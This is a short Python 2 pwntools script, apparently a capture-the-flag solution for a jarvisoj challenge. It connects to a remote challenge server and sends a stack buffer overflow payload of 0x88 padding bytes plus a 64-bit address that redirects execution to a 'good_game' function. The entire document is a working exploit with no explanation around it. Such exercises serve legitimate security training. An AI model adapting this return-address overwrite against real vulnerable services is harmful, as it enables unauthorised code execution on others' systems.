#!/usr/bin/env python2
from pwn import *

good_game_addr = 0x0000000000400620
conn = remote('pwn.jarvisoj.com', 9876)

print conn.read(),
conn.send_raw('A' * 0x88 + pack(good_game_addr, 64))
sleep(1)
print conn.read(),
